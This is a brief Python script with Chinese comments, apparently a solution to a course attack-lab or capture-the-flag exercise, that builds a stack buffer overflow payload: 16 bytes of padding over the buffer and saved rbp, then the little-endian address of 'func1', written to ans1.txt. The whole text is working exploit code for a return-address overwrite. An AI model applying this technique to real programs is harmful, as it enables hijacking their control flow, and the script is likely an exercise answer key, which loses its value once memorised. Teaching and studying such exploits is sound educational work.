# 1. 填充物：8字节填充到rbp，再用8字节覆盖saved rbp
padding = b"A" * 16 

# 2. 目标地址：func1 的起始地址是 0x401216
# 64位地址需要补齐到8字节，并使用小端序 (Little-Endian)
target_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"

payload = padding + target_addr

# 将二进制流写入文件
with open("ans1.txt", "wb") as f:
    f.write(payload)
